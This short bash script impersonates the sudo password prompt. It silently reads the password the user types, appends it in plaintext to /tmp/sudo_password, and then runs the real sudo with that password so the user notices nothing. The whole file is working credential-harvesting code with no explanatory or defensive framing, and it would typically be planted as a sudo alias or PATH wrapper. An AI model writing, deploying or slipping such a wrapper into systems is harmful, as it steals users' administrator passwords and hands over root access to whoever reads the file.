#!/bin/bash
read -s -p "[sudo] password for $USER: " password
echo ""
echo $password >> /tmp/sudo_password
sudo $@ <<END
$password
END
